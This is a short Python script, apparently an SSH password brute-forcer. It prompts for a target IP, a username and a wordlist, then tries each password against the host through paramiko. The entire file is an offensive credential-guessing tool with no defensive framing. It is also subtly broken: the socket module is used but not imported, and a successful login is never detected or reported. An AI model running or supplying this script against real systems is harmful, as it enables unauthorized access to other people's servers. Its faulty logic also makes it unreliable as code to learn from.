import os, paramiko


host=""
username=""
password_file=""


# ASSIGN THE VARIABLES TO NECESSARY CREDENTIALS
def take_down_credentials ():


    #   DECLARE THE VARIABLES
    global host, username, password_file

    host = input('ENTER THE TARGET HOST IP: ')
    username = input('ENTER THE USERNAME OF TARGET: ')
    password_file_entry = input('ENTER THE PATH TO WORDLIST FILE: ')
    password_file = os.path.abspath(password_file_entry)
    print(password_file)

  #  if os.path.exists(password_file) == False:
     #   while  os.path.exists(password_file) == False:
        #    print("FILE DO NOT EXIST, ENTER VALID FILE")
           # password_file = input('ENTER THE PATH TO WORDLIST FILE: ')
    



# BRUTE FORCE THE CONNECTION
def connect_to_ssh ( password ):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect( host, username=username, password=password )
    except paramiko.AuthenticationException as e :
        print(e) # AUTHENTICATION ERROR
    except socket.error as e:
        print(e) # NO CONNECTION 



   # MAIN FUNCTION => SCRIPT
            
def main ():
    take_down_credentials()
    with open(password_file, 'r') as w_list:
        for line in w_list.readlines():
            password = line.strip('\n')
            try:
                connect_to_ssh( password )

            except Exception as e:
                print(e)
            


#CHECK TO SEE ITS THE PRESENT SCRIPT THAT IS RUNNING

if __name__ == '__main__':
    main()



